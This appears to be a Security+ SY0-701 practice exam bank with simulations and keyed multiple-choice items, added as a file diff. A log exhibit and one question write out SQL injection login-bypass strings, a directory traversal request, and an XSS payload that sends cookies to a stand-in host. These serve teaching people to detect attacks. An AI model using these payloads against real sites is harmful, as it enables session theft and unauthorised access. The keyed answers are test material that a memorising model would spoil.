@@ -1,0 +1,1234 @@
+# Security+ SY0-701 — Exam bank B (85 questions + 5 PBQs)
+# Export for second-model review. '*' marks the keyed answer. Report any item where you believe the key, a distractor explanation, or a sim grading key is wrong for CompTIA Security+ SY0-701, citing the objective bullet.
+
+==== PBQs (presented first) ====
+
+[pb1] sim=appanel domain=4 obj=4.1 (Given a scenario, apply common security techniques to computing resources)
+TITLE: Trading floor: configure the high-security SSID
+PROMPT: The traders' wireless profile must meet the bank's top tier. Change only what the standard requires.
+TASK:
+    1. SSID TradeFloor on 5 GHz only.
+    2. Use the highest-assurance Enterprise mode the standard names: the 192-bit suite.
+    3. Traders' laptops hold certificates from the bank's PKI; authenticate with those certificates.
+    4. The RADIUS server (172.16.40.5, port 1812) is already configured; keep it. Management frames must be protected on every client.
+DEVICE: AP-TRD-11 — fields not listed under KEY must stay at their START value (changing them costs ½ point):
+      SSID (network name): start=TradeFloor
+      Hide SSID (disable broadcast): start=Off
+    * Band: start=2.4 + 5 GHz  →  KEY=5 GHz
+    * Security mode: start=WPA2-Enterprise  →  KEY=WPA3-Enterprise 192-bit   // WPA3-Enterprise 192-bit mode mandates the CNSA cipher suite (GCMP-256, 384-bit curves) for high-security environments.
+      Passphrase (pre-shared key): start=
+    * EAP method: start=PEAP (MSCHAPv2)  →  KEY=EAP-TLS   // 192-bit mode requires EAP-TLS with suitable certificates; password-based methods are not permitted.
+      RADIUS server: start=172.16.40.5
+      RADIUS authentication port: start=1812
+      RADIUS shared secret: start=Vault-Cobalt-8835
+    * Protected management frames (802.11w): start=Optional  →  KEY=Required
+      WPS push-button / PIN setup: start=Off
+      MAC filtering: start=Off
+      Client isolation (block client-to-client): start=Off
+      Admin interface reachable from wireless clients: start=Off
+      Admin password: start=Changed to a unique strong password
+TAKEAWAY: Highest tier = WPA3-Enterprise 192-bit + EAP-TLS + PMF required. Fields that were already correct (RADIUS details) stay; fields that were never requested (hidden SSID, MAC filtering) stay too.
+
+[pb2] sim=hardening domain=4 obj=4.1 (Given a scenario, apply common security techniques to computing resources)
+TITLE: Plant OT: harden the engineering workstation
+PROMPT: Bring the PLC programming workstation to the OT baseline without breaking the engineers' work.
+TASK:
+    1. The PLC programming software and its OT network connection must keep working.
+    2. The workstation is dual-homed: remove its path to the office LAN and its wireless radios.
+    3. Engineers remote in only from the engineering VLAN. Removable storage is prohibited on OT. Engineers are not local administrators.
+    4. Patch only in the monthly outage window; the EDR agent must be running and the disk encrypted. SMBv1 goes.
+HOST: ENG-WS-03 · Windows 10 LTSC · PLC programming station on the OT network; the vendor's engineering software downloads logic to PLCs; engineers RDP in from the engineering VLAN (10.0.5.0/24)
+CONTROLS ('*' = scored; 'crit' = changing it breaks the business function, −1; unmarked = leave alone, −½ if changed):
+  Network interfaces
+    ! OT network adapter (10.0.200.0/24): start=Enabled  [crit: keep]   // That is the link to the PLCs.
+    * Office LAN adapter (10.0.10.0/24): start=Enabled  →  KEY=Disabled   // A dual-homed host is a bridge between the IT and OT networks; attackers pivot across it.
+    * Wi-Fi radio: start=On  →  KEY=Off
+    * Bluetooth radio: start=On  →  KEY=Off
+  Remote access
+    * Remote Desktop allowed from: start=Any  →  KEY=Engineering VLAN 10.0.5.0/24 only   // 'Off' locks the engineers out.
+    * Remote Assistance: start=On  →  KEY=Off
+  Accounts & media
+    ! PLC engineering software service: start=Running  [crit: keep]
+    * Engineers group: start=Local Administrators  →  KEY=Standard users (elevate via PAM)
+    * USB mass storage: start=Allowed  →  KEY=Blocked
+  Baseline
+    * Windows Update: start=Automatic, reboot when required  →  KEY=Monthly outage window via WSUS   // An unscheduled reboot mid-download can corrupt PLC logic.
+    * EDR agent: start=Stopped  →  KEY=Running
+    * BitLocker: start=Off  →  KEY=On
+    * SMBv1: start=Installed  →  KEY=Removed
+    ! Host firewall: start=On  [crit: keep]   // It enforces the RDP source restriction; nothing asked you to turn it off.
+TAKEAWAY: OT hardening: no dual-homing, no radios, no removable media, least privilege, remote access from one VLAN, patches in the outage window. Availability of the production link is non-negotiable.
+
+[pb3] sim=fwrule domain=3 obj=3.2 (Given a scenario, apply security principles to secure enterprise infrastructure)
+TITLE: Firewall rule evaluation
+PROMPT: Walk the rule table top-down for the packet shown.
+TASK:
+    1. Compare the packet's source, destination and port against each rule from the top.
+    2. Stop at the first rule where all three match; that rule's action applies.
+    3. If nothing matches, the implicit deny at the bottom applies.
+(generated: a fresh problem every attempt; grader in core/sims/generators.js)
+
+[pb4] sim=exhibit domain=2 obj=2.4 (Given a scenario, analyze indicators of malicious activity)
+TITLE: Exhibit: web server log
+SETUP: A cloud startup's web application firewall is in monitor-only mode. The access log shows these requests from one client in under a minute.
+EXHIBIT:
+    203.0.113.77 GET /login?user=admin'--&pass=x                       200
+    203.0.113.77 GET /login?user=admin' OR '1'='1&pass=x               200
+    203.0.113.77 GET /search?q=<script>document.location='http://evil.example/c?'+document.cookie</script> 200
+    203.0.113.77 GET /files?name=../../../../etc/passwd                 403
+    203.0.113.77 GET /api/orders?id=1000                                200
+    203.0.113.77 GET /api/orders?id=1001                                200
+    203.0.113.77 GET /api/orders?id=1002                                200
+  1. What are the first two requests attempting?
+     * A. SQL injection to bypass authentication
+       B. Cross-site scripting
+       C. Directory traversal
+       D. Credential stuffing with a leaked password list
+     why: Quote-and-comment (admin'--) and the always-true OR '1'='1 are authentication-bypass SQL injection payloads. XSS uses script tags; traversal uses ../; stuffing uses many real credential pairs.
+  2. What is the third request attempting, and who is the victim?
+     * A. Reflected cross-site scripting that steals another user's session cookie
+       B. A denial of service against the search index
+       C. SQL injection against the search table
+       D. A brute-force attack on the search function
+     why: The script tag sends document.cookie to an attacker host; if the search page echoes input, any user tricked into that URL leaks their session. The server is the carrier, the user is the victim.
+  3. The 403 on the fourth request shows which control worked?
+     * A. Input validation or path restriction blocked directory traversal
+       B. The WAF blocked the request
+       C. Rate limiting blocked the client
+       D. TLS prevented the download
+     why: ../ sequences reaching for /etc/passwd is directory traversal; a 403 means the app or web server refused the path. The WAF is in monitor-only mode, so it did not block.
+  4. What do the last three requests suggest, and what is the BEST fix?
+     * A. Sequential IDs are being enumerated (insecure direct object reference); enforce authorization on every object and use non-guessable IDs
+       B. Normal browsing; no action
+       C. A buffer overflow; patch the API
+       D. A DDoS; add more capacity
+     why: Walking id=1000, 1001, 1002 with 200 responses means the API returns other customers' orders without checking ownership. Server-side authorization per object is the fix.
+TAKEAWAY: Read payloads: quotes and OR 1=1 are SQLi, script tags are XSS, ../ is traversal, sequential IDs are IDOR. Input validation and server-side authorization are the fixes; move the WAF to blocking.
+
+[pb5] sim=risk domain=5 obj=5.2 (Explain elements of the risk management process)
+TITLE: Risk math: SLE, ALE, cost-benefit
+PROMPT: Compute the loss figures and decide whether the control is worth buying.
+TASK:
+    1. SLE = asset value × exposure factor.
+    2. ALE = SLE × ARO (events per year).
+    3. The control is justified when the ALE it removes exceeds its annual cost. The calculator is in this pane.
+(generated: a fresh problem every attempt; grader in core/sims/generators.js)
+
+==== QUESTIONS ====
+
+[b001] type=mc domain=3 obj=3.1 (Compare and contrast security implications of different architecture models) cat=arch
+Q: A cloud-native startup runs its API on virtual machines rented from a public cloud provider under an IaaS model. A scan shows the VMs' Linux kernels are three months behind on security updates. Which of the following is responsible for applying these updates?
+  * A. The startup, because guest operating systems are the customer's responsibility under IaaS
+        why: In the shared responsibility matrix, IaaS providers secure the physical hosts, hypervisor, and network fabric; everything inside the VM, including the guest OS and its patches, belongs to the customer.
+    B. The cloud provider, because it owns the hypervisor the VMs run on
+        why: The provider does patch the hypervisor, but a guest kernel inside a tenant VM is not part of the hypervisor and the provider has no access to it under IaaS.
+    C. The cloud provider, because kernel updates are part of the managed runtime
+        why: A managed runtime is a PaaS feature. The startup chose IaaS, where no runtime or OS management is included.
+    D. Neither party, because IaaS VMs are immutable and are replaced rather than patched
+        why: Immutable infrastructure is a design choice the customer may adopt, but it still means the customer must rebuild from a patched image; the responsibility does not disappear.
+TAKEAWAY: Responsibility matrix: IaaS = customer owns the OS and up; PaaS = provider owns the OS and runtime; SaaS = provider owns everything except data, identities, and configuration.
+
+[b002] type=mc domain=2 obj=2.3 (Explain various types of vulnerabilities) cat=vulns
+Q: A manufacturing execution system verifies that a recipe file is digitally signed, then several seconds later reads the file into the PLC programming tool. An attacker on the engineering workstation swaps the file between the check and the read, and the unsigned version is loaded. Which of the following vulnerabilities was exploited?
+  * A. Time-of-check to time-of-use race condition
+        why: The system validated the file at one moment and used it at a later moment; the gap between check and use let the attacker substitute content. That is the definition of a TOC/TOU race condition.
+    B. Buffer overflow in the PLC programming tool
+        why: Nothing in the scenario involves writing past a memory boundary; the tool loaded a well-formed but unsigned file that had been swapped in.
+    C. Malicious update from the PLC vendor
+        why: The file came from an attacker on the workstation, not from a compromised vendor update channel.
+    D. Improper input validation on recipe parameters
+        why: The recipe's contents were never the issue; the signature check itself was correct but was performed too early to be meaningful.
+TAKEAWAY: TOC/TOU: a check that is separated in time from the action it protects can be raced. Fix by checking and using atomically (e.g., verify the file handle you actually read from).
+
+[b003] type=mc domain=5 obj=5.3 (Explain the processes associated with third-party risk assessment and management) cat=third
+Q: A financial services firm plans to use one managed security provider for several years of assorted projects. Legal wants a single umbrella contract covering payment terms, liability, and confidentiality so that each future project only needs a short document describing its deliverables. Which of the following should be signed FIRST?
+  * A. Master service agreement
+        why: An MSA establishes the general terms that govern the whole relationship; individual projects are then defined by statements of work that inherit those terms.
+    B. Statement of work
+        why: A SOW describes one specific engagement's tasks, deliverables, and timeline; it is the short per-project document the firm wants to create later, not the umbrella.
+    C. Service-level agreement
+        why: An SLA defines measurable performance targets such as response times; it does not set liability, payment, or confidentiality terms for an entire relationship.
+    D. Memorandum of understanding
+        why: An MOU documents intent to cooperate and is usually not legally binding, which is the opposite of what legal wants for liability and payment terms.
+TAKEAWAY: MSA = the long-term umbrella; SOW = the per-project detail; SLA = the performance metrics; MOU = non-binding intent.
+
+[b004] type=mc domain=1 obj=1.4 (Explain the importance of using appropriate cryptographic solutions) cat=crypto
+Q: A startup must encrypt 40 TB of customer records each night before shipping them to an archive bucket, and must also let a partner decrypt the archive without ever sharing a long-term secret in advance. Which of the following designs BEST meets both requirements?
+  * A. Encrypt the data with AES and encrypt the AES key with the partner's RSA public key
+        why: Symmetric AES handles the 40 TB efficiently; asymmetric RSA wraps only the small session key so the partner can unwrap it with their private key. This hybrid approach is how TLS and PGP work.
+    B. Encrypt the entire archive with the partner's RSA public key
+        why: Asymmetric encryption is thousands of times slower than symmetric and is impractical for bulk data; it is used for key exchange and signatures, not 40 TB payloads.
+    C. Encrypt the archive with AES and email the AES key to the partner
+        why: This shares the secret over an unprotected channel, which is exactly the key distribution problem asymmetric cryptography exists to solve.
+    D. Hash the archive with SHA-256 and send the partner the digest
+        why: Hashing is one-way and provides integrity, not confidentiality; the partner could verify the archive but never recover the records from a digest.
+TAKEAWAY: Symmetric for speed on bulk data, asymmetric for exchanging the symmetric key. Hashing never decrypts anything.
+
+[b005] type=mc domain=4 obj=4.6 (Given a scenario, implement and maintain identity and access management) cat=iam
+Q: A startup's deployment pipeline currently uses a shared cloud admin access key stored in the CI system. The security lead wants each pipeline run to receive its own short-lived credential that expires when the job ends, with no static secret to steal. Which of the following BEST describes this approach?
+  * A. Ephemeral credentials issued through a privileged access management workflow
+        why: Ephemeral (temporary) credentials are minted per session and expire automatically, eliminating the standing shared key that attackers target. This is a core PAM capability.
+    B. Password vaulting of the existing admin key
+        why: A vault protects the static key at rest and logs checkouts, but the same long-lived key would still be handed to every job and remain valuable if leaked.
+    C. Rotating the shared key every 90 days
+        why: Rotation shortens exposure but leaves a shared, reusable secret in place for weeks at a time; the requirement was no static secret at all.
+    D. Federating the CI system with the identity provider using SAML
+        why: Federation addresses how humans sign on to applications; it does not by itself issue per-job cloud credentials to a pipeline.
+TAKEAWAY: Just-in-time and ephemeral credentials remove standing privilege: the credential exists only while the task runs.
+
+[b006] type=mc domain=2 obj=2.4 (Given a scenario, analyze indicators of malicious activity) cat=attacks
+Q: A bank's web application firewall logs the request below against the online banking login page. Which of the following attacks is being attempted?
+EXHIBIT:
+    POST /login HTTP/1.1
+    Host: 203.0.113.10
+    user=jsmith' OR '1'='1'--&pass=x
+    
+    Response: 302 Found  Location: /accounts
+  * A. SQL injection
+        why: The quote, OR '1'='1', and comment marker are classic SQL syntax meant to make the login query's WHERE clause always true; the 302 redirect to /accounts suggests it worked.
+    B. Cross-site scripting
+        why: XSS payloads contain script or HTML tags intended for other users' browsers; this payload contains SQL syntax aimed at the database query.
+    C. Credential replay
+        why: Replay reuses a previously captured valid credential or token; here the attacker did not know any real password and instead manipulated the query logic.
+    D. Directory traversal
+        why: Traversal uses ../ sequences in a path to read files outside the web root; nothing in this request touches the file system path.
+TAKEAWAY: Quotes, OR 1=1, and -- in a form field = SQL injection. Defend with parameterized queries and input validation, not just a WAF.
+
+[b007] type=mc domain=3 obj=3.3 (Compare and contrast concepts and strategies to protect data) cat=data
+Q: A payments startup must let its analytics team query transaction history by card, but auditors require that the real card numbers never exist in the analytics database at all. Analysts only need to recognize when two records belong to the same card. Which of the following BEST meets the requirement?
+  * A. Tokenization, storing the mapping in a separate vault
+        why: A token is a surrogate value with no mathematical relationship to the card number; the same card always maps to the same token, so analysts can group records while the real PAN lives only in the vault.
+    B. Full-database encryption with a key held by the DBA
+        why: Encrypted data is still the real card number once decrypted, and the DBA's key would expose it; auditors said the PAN must not be in the analytics store in any form.
+    C. Masking the last four digits in query results
+        why: Masking hides part of the value at display time, but the complete PAN would still be stored in the analytics database, which the auditors forbid.
+    D. Salting and hashing each card number
+        why: A unique salt per record would break the ability to match records for the same card, and unsalted hashes of 16-digit PANs can be brute-forced quickly.
+TAKEAWAY: Tokenization replaces sensitive data with a reference value and keeps the real data in a vault; it preserves matching without exposing the original.
+
+[b008] type=mc domain=5 obj=5.4 (Summarize elements of effective security compliance) cat=gov
+Q: A bank outsources employee payroll to a SaaS provider. The bank decides which employee fields are collected and how long they are kept; the provider stores and calculates the payroll according to the bank's written instructions. A regulator asks who is the data controller. Which of the following is correct?
+  * A. The bank, because it determines the purpose and means of processing
+        why: The controller is the party that decides why and how personal data is processed. The bank sets the fields, the retention period, and the purpose, so it is the controller.
+    B. The SaaS provider, because it physically stores the data
+        why: Storing and calculating on someone else's instructions is what a processor does; possession of the data does not make the provider the controller.
+    C. The employees, because the data is about them
+        why: Employees are the data subjects, the individuals the data describes; they have rights over the data but are not the controller.
+    D. The bank's IT department, because it administers the integration
+        why: IT acts as a custodian handling the systems; the controller role belongs to the organization that decides the purpose of processing, not the team that runs the plumbing.
+TAKEAWAY: Controller decides purpose and means; processor acts on the controller's instructions; data subject is the person described; custodian runs the systems.
+
+[b009] type=ms domain=4 obj=4.3 (Explain various activities associated with vulnerability management) cat=ops
+Q: A plant's vulnerability scanner reports the finding below on a historian server in the OT network. The server is reachable only from the control network and holds no personal data, but if it stops, production reporting halts. Which TWO of the following statements are correct?
+EXHIBIT:
+    CVE-2024-XXXX  Remote code execution in historian web service
+    CVSS v3.1 Base: 9.8 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)
+    Exploit: public proof of concept available
+    Vendor patch: available, requires 2 hours downtime
+(choose 2)
+  * A. Environmental factors such as the isolated network can justify a lower organizational priority than the base score alone
+        why: The base score assumes worst case. CVSS environmental metrics let the plant account for the fact that the service is not internet-facing, adjusting the effective risk.
+  * B. The patch should be scheduled in a maintenance window rather than applied immediately during a production run
+        why: The two-hour downtime affects production reporting, so change management should schedule it, with segmentation and monitoring as interim compensating controls.
+    C. The finding can be closed as a false positive because the server is not on the internet
+        why: A false positive means the vulnerability does not exist. It does exist; network isolation reduces likelihood but is not proof the finding is wrong.
+    D. The base score should be manually lowered to 5.0 in the scanner
+        why: The base score is defined by the vulnerability's characteristics and should not be edited; environmental and temporal metrics are the correct way to reflect local context.
+    E. Because there is no personal data, the vulnerability does not need to be reported
+        why: Vulnerability reporting is about the risk to operations and integrity as well as confidentiality; an RCE on a production historian is clearly reportable.
+TAKEAWAY: Prioritize with base score plus environmental context, exploitability, and business impact. Isolation lowers risk; it does not make a real vulnerability a false positive.
+
+[b010] type=mc domain=1 obj=1.1 (Compare and contrast various types of security controls) cat=controls
+Q: A manufacturing plant posts signs at every gate stating that the yard is under 24-hour video surveillance, but only the main gate actually has a camera. The security manager asks how the signs at the other gates should be classified. Which of the following is the BEST answer?
+  * A. A physical deterrent control
+        why: The sign's only effect is to discourage an intruder who believes they are being watched; it cannot detect, prevent, or correct anything. That makes it deterrent, and it is a physical object at the perimeter.
+    B. A physical detective control
+        why: Detective controls record or reveal that an event happened. The main-gate camera is detective; a sign with no camera behind it detects nothing.
+    C. A technical preventive control
+        why: A sign is not a technology and cannot physically stop entry; preventive controls at the gate would be locks, fencing, or a vestibule.
+    D. A managerial directive control
+        why: Directive controls tell authorized people what to do, such as a policy or procedure; a warning aimed at would-be intruders is a deterrent, not guidance.
+TAKEAWAY: Deterrent controls change an attacker's decision; detective controls reveal events. Ask what the control actually does, not what it claims.
+
+[b011] type=mc domain=3 obj=3.4 (Explain the importance of resilience and recovery in security architecture) cat=data
+Q: A brokerage takes storage snapshots of its order database every 60 minutes and has tested that rebuilding the database server from a snapshot takes about four hours. Which of the following correctly describes what these numbers mean?
+  * A. The achievable RPO is 60 minutes and the achievable RTO is about four hours
+        why: RPO is how much data can be lost, set by the time since the last usable copy (up to an hour). RTO is how long restoration takes, which testing shows is four hours.
+    B. The achievable RTO is 60 minutes and the achievable RPO is about four hours
+        why: This reverses the definitions: the snapshot interval bounds data loss (RPO), while the rebuild time bounds downtime (RTO).
+    C. The MTTR is 60 minutes because that is how often the system self-heals
+        why: MTTR is the average time to repair a failed component; snapshots do not repair anything, they only preserve a point in time.
+    D. The RPO is zero because snapshots are application-consistent
+        why: Consistency makes a snapshot restorable, but any transaction after the last snapshot is lost, so RPO cannot be zero with hourly copies.
+TAKEAWAY: RPO = maximum acceptable data loss (backup frequency); RTO = maximum acceptable downtime (restore speed). Snapshots set RPO, restore testing reveals RTO.
+
+[b012] type=mc domain=2 obj=2.1 (Compare and contrast common threat actors and motivations) cat=actors
+Q: During an asset review, a startup discovers that its growth team has been uploading customer lists to an unapproved marketing analytics service using personal accounts, without informing IT or security. No malicious intent is found. Which of the following BEST describes this threat actor?
+  * A. Shadow IT
+        why: Employees deploying unsanctioned services for legitimate work, bypassing security review, is shadow IT. The risk is real (customer data on an unvetted platform) even though the motive is productivity.
+    B. Insider threat with a revenge motivation
+        why: The review found no malicious intent; the team was trying to do its job, not harm the company.
+    C. Unskilled attacker using off-the-shelf tools
+        why: An unskilled attacker is an external party running pre-built exploits; these are authorized employees using a business service.
+    D. Organized crime performing data exfiltration
+        why: Nothing indicates an external criminal group; the data left through an employee's well-intended but unapproved workflow.
+TAKEAWAY: Shadow IT is an internal actor without malicious motive whose unsanctioned systems still create exposure. Detect with asset inventory, CASB, and DLP.
+
+[b013] type=mc domain=4 obj=4.8 (Explain appropriate incident response activities) cat=ir
+Q: An engineer at a manufacturing plant notices that an HMI workstation on the packaging line is encrypting files and displaying a ransom note. The line is still running because the PLCs operate independently. Which of the following should the incident response team do FIRST?
+  * A. Disconnect the HMI from the control network while leaving it powered on
+        why: Isolating the host stops the malware from spreading to other HMIs and engineering stations, while keeping it powered preserves volatile memory for analysis. This is containment.
+    B. Power off every PLC on the packaging line
+        why: The PLCs are not infected and shutting them down causes the production outage the attacker may have wanted; containment should be proportionate and targeted.
+    C. Re-image the HMI from the golden image immediately
+        why: Rebuilding is eradication and recovery; doing it first destroys evidence and skips containment, so other hosts may already be infected.
+    D. Begin a lessons-learned review with plant management
+        why: Lessons learned is the final phase after recovery; during an active infection the priority is stopping the spread.
+TAKEAWAY: IR order: detect, analyze, contain, eradicate, recover, learn. Contain by isolating the host from the network, not by powering off unaffected equipment.
+
+[b014] type=mc domain=5 obj=5.3 (Explain the processes associated with third-party risk assessment and management) cat=third
+Q: Before evaluating three software vendors, a financial firm needs to share its internal network architecture and integration requirements with each of them. Which of the following should be executed with each vendor BEFORE the documents are shared?
+  * A. Non-disclosure agreement
+        why: An NDA legally binds each vendor to keep the architecture confidential, which is the protection needed before sensitive design details leave the firm during evaluation.
+    B. Service-level agreement
+        why: An SLA sets performance targets for a service the firm has already purchased; none of the vendors has been selected yet.
+    C. Business partners agreement
+        why: A BPA governs a joint venture's responsibilities and profit sharing; the firm is evaluating suppliers, not forming a partnership.
+    D. Right-to-audit clause
+        why: A right-to-audit clause lets the firm inspect a vendor's controls once a contract exists; it does not protect information disclosed during pre-sales evaluation.
+TAKEAWAY: NDA first whenever confidential information is exchanged, including during vendor selection, before any service contract is in place.
+
+[b015] type=mc domain=3 obj=3.1 (Compare and contrast security implications of different architecture models) cat=arch
+Q: A startup rewrites an image-resizing job as cloud functions that run only when a file is uploaded, and the provider bills per invocation. The CTO asks what security work remains for the startup itself. Which of the following is the BEST answer?
+  * A. Securing the function code, its dependencies, permissions, and the events that trigger it
+        why: With serverless, the provider runs and patches the execution environment, but the startup still owns its code, third-party libraries, the IAM role the function assumes, and input validation on triggers.
+    B. Patching the operating system that hosts the functions
+        why: Serverless removes OS management from the customer entirely; the provider owns the underlying hosts and runtime.
+    C. Nothing, because the provider assumes all security responsibility for serverless workloads
+        why: No cloud model transfers responsibility for the customer's own code, data, and identity configuration; a vulnerable function is the startup's problem.
+    D. Hardening the hypervisor to prevent VM escape between functions
+        why: The hypervisor is invisible to serverless customers and is exclusively the provider's responsibility.
+TAKEAWAY: Serverless shifts OS and runtime patching to the provider; code, dependencies, least-privilege roles, and input handling stay with you.
+
+[b016] type=mc domain=2 obj=2.2 (Explain common threat vectors and attack surfaces) cat=social
+Q: An accounts-payable clerk at a bank receives an email from a long-time supplier's genuine address asking that future payments go to a new account. The thread includes real prior correspondence, and the writing style matches. Two weeks later the supplier reports it was never paid. Which of the following BEST describes the attack?
+  * A. Business email compromise using the supplier's hijacked mailbox
+        why: The message came from the real account with real thread history, meaning the supplier's mailbox was compromised and used to redirect payments. This is the invoice-fraud form of BEC.
+    B. Typosquatting of the supplier's domain
+        why: Typosquatting relies on a lookalike domain; the scenario states the email came from the supplier's genuine address.
+    C. Pretexting by an impersonated bank executive
+        why: No executive was impersonated and no fabricated story was needed; the attacker relied on an authentic existing conversation.
+    D. Watering hole attack on the supplier's website
+        why: A watering hole compromises a site that victims visit to infect them; this attack abused email to change payment details, not a website.
+TAKEAWAY: BEC often comes from a real compromised account, so header checks pass. Verify any banking change by calling a known number, never through the same email thread.
+
+[b017] type=mc domain=4 obj=4.1 (Given a scenario, apply common security techniques to computing resources) cat=harden
+Q: A plant's HMI workstations run a vendor-locked Windows build on which the vendor forbids installing antivirus or applying non-approved updates. Malware has repeatedly been introduced by USB drives. Which of the following hardening measures BEST reduces the risk without violating the vendor's conditions?
+  * A. Enforce an application allow list so only the HMI software and signed vendor tools can execute
+        why: An allow list blocks any unapproved executable, including USB-borne malware, without adding third-party scanning software or changing the vendor image. It is the standard ICS/SCADA hardening approach.
+    B. Install an endpoint detection and response agent from a different vendor
+        why: The vendor explicitly forbids adding security software; an EDR agent would void support just as antivirus would.
+    C. Apply the latest Windows cumulative update outside the vendor's schedule
+        why: Non-approved updates are prohibited and may break the HMI software; patching is not an option under these conditions.
+    D. Move the HMIs to the corporate network so the central antivirus can scan them
+        why: This increases the attack surface by exposing control systems to the enterprise LAN and still requires installing the forbidden agent.
+TAKEAWAY: When you cannot patch or install agents on OT hosts, use allow listing, USB port controls, and segmentation as compensating controls.
+
+[b018] type=mc domain=1 obj=1.4 (Explain the importance of using appropriate cryptographic solutions) cat=crypto
+Q: A startup's authentication service stores passwords as a single SHA-256 hash with a per-user salt. A penetration tester cracks 30% of them in a day using GPUs. Which of the following changes would MOST increase the attacker's cost per guess?
+  * A. Replace the single hash with a key-stretching function such as bcrypt or PBKDF2 with a high work factor
+        why: Key stretching runs thousands of iterations (or memory-hard operations) per guess, turning billions of GPU guesses per second into thousands. Salting was already present; speed was the problem.
+    B. Switch from SHA-256 to SHA-512
+        why: SHA-512 is a different fast hash, still designed to run quickly; it does not materially slow a GPU cracking rig.
+    C. Use a single global salt stored in the application config
+        why: Moving from per-user salts to one shared salt is a downgrade that re-enables precomputed attacks across all accounts.
+    D. Encrypt the hashes with AES before storing them
+        why: If the attacker obtained the database they likely can obtain the application's key too; and encryption does not slow guessing once the layer is removed.
+TAKEAWAY: Salt defeats precomputation; key stretching (bcrypt, scrypt, Argon2, PBKDF2) defeats speed. Password storage needs both.
+
+[b019] type=mc domain=4 obj=4.5 (Given a scenario, modify enterprise capabilities to enhance security) cat=ops
+Q: A bank has published the DNS records below for its domain. Customers still report receiving convincing phishing emails that appear to come from the bank's exact domain. Which of the following changes would BEST reduce these spoofed messages reaching customers?
+EXHIBIT:
+    bank.example  TXT  "v=spf1 include:_spf.mailhost.example -all"
+    selector1._domainkey.bank.example  TXT  "v=DKIM1; k=rsa; p=MIIB..."
+    _dmarc.bank.example  TXT  "v=DMARC1; p=none; rua=mailto:dmarc@bank.example"
+  * A. Change the DMARC policy from p=none to p=reject after reviewing aggregate reports
+        why: SPF and DKIM are in place, but p=none tells receivers to take no action on failures. Moving to quarantine and then reject instructs receiving servers to drop spoofed mail.
+    B. Change the SPF record from -all to +all
+        why: +all authorizes every sender in the world, which would make spoofing easier, not harder.
+    C. Remove the DKIM record because the public key is exposed
+        why: DKIM public keys are meant to be published; removing DKIM removes one of the two authentication checks DMARC relies on.
+    D. Add a second rua address so more staff receive reports
+        why: More reporting recipients improves visibility but does nothing to stop receivers from delivering spoofed messages.
+TAKEAWAY: SPF and DKIM authenticate; DMARC tells receivers what to do on failure. p=none is monitor-only; enforcement requires quarantine or reject.
+
+[b020] type=mc domain=5 obj=5.2 (Explain elements of the risk management process) cat=gov
+Q: A plant's risk register contains the entry below. Which of the following is the annualized loss expectancy for this risk?
+EXHIBIT:
+    Risk: Fire in paint booth
+    Asset value (AV): $2,000,000
+    Exposure factor (EF): 25%
+    Annualized rate of occurrence (ARO): 0.1
+    Risk owner: Plant manager
+  * A. $50,000
+        why: SLE = AV × EF = 2,000,000 × 0.25 = $500,000. ALE = SLE × ARO = 500,000 × 0.1 = $50,000 expected loss per year.
+    B. $500,000
+        why: $500,000 is the single loss expectancy, the cost of one fire; it has not yet been multiplied by how often a fire is expected (once per ten years).
+    C. $200,000
+        why: This is AV × ARO, which skips the exposure factor; the fire destroys 25% of the asset, not all of it.
+    D. $5,000,000
+        why: This multiplies the SLE by 10 instead of by 0.1; an ARO of 0.1 means once every ten years, so the annual figure must be smaller than the SLE.
+TAKEAWAY: SLE = AV × EF; ALE = SLE × ARO. An ARO below 1 always makes ALE smaller than SLE.
+
+[b021] type=mc domain=3 obj=3.2 (Given a scenario, apply security principles to secure enterprise infrastructure) cat=netsec
+Q: A manufacturing plant must send production metrics from its control network to a corporate dashboard while guaranteeing that no traffic, not even a TCP acknowledgement, can ever flow from the corporate side into the control network. Which of the following BEST meets this requirement?
+  * A. A unidirectional gateway (data diode) between the control network and a replication server
+        why: A data diode physically permits data in one direction only, so an attacker on the corporate side has no path in. It is the standard approach for one-way OT-to-IT reporting.
+    B. A stateful firewall permitting only outbound connections from the control network
+        why: Stateful firewalls still pass return packets for established sessions, so acknowledgements and responses flow back into the control network, which the requirement forbids.
+    C. A jump server in a screened subnet between the two networks
+        why: A jump server is a controlled bidirectional path for administrators; it exists precisely to let traffic reach the protected zone.
+    D. A VPN tunnel with IPSec between the historian and the dashboard
+        why: IPSec protects confidentiality and integrity but is fully bidirectional; encryption does not prevent inbound traffic.
+TAKEAWAY: Physical isolation or a unidirectional gateway is the only way to enforce truly one-way flow; firewalls and VPNs are bidirectional by nature.
+
+[b022] type=mc domain=2 obj=2.3 (Explain various types of vulnerabilities) cat=vulns
+Q: A startup provisions a new virtual disk in its cloud tenant and, before formatting it, a developer reads raw sectors and finds fragments of another organization's database backup. Which of the following vulnerabilities does this represent?
+  * A. Resource reuse in a virtualized environment
+        why: When a hypervisor or storage layer reassigns memory or disk blocks to a new tenant without sanitizing them, the previous tenant's data leaks. This is the resource reuse vulnerability listed under virtualization.
+    B. VM escape from the developer's instance
+        why: VM escape means code inside a guest breaks out to the hypervisor or other guests; here the developer stayed within their own VM and simply read unsanitized storage.
+    C. Cloud storage bucket misconfiguration
+        why: No bucket permissions were involved; the data appeared on a freshly allocated block device, not through a public object listing.
+    D. Side-channel attack via shared CPU cache
+        why: Side channels infer secrets through timing or cache behavior; this was direct recovery of leftover data from reused blocks.
+TAKEAWAY: Virtualization vulns: VM escape (break out of the guest) versus resource reuse (leftover data from a previous tenant). Providers must zero storage before reallocation.
+
+[b023] type=mc domain=4 obj=4.6 (Given a scenario, implement and maintain identity and access management) cat=iam
+Q: A B2B startup wants each corporate customer's staff to sign in to the startup's web portal using the customer's own identity provider, so the startup never stores those users' passwords and can receive group membership from the customer. Which of the following should the startup implement?
+  * A. Federation with the customer IdPs using SAML assertions
+        why: SAML federation lets the customer's IdP authenticate the user and send a signed assertion containing identity and group attributes to the portal, which acts as the service provider.
+    B. LDAP binds from the portal to each customer's directory
+        why: Direct LDAP binds would require the portal to handle the customer's passwords and reach into each customer's internal directory, which most customers will not permit.
+    C. A local account per user with mandatory MFA
+        why: Local accounts mean the startup stores credentials and manages lifecycle for other companies' staff, the opposite of the requirement.
+    D. Kerberos tickets from the startup's own domain controller
+        why: Kerberos works within a single realm or trusted domains; it is not designed for cross-organization web SSO with arbitrary customers.
+TAKEAWAY: Federation = trust another organization's IdP. SAML (and OIDC) carry signed assertions with attributes; the SP never sees the password.
+
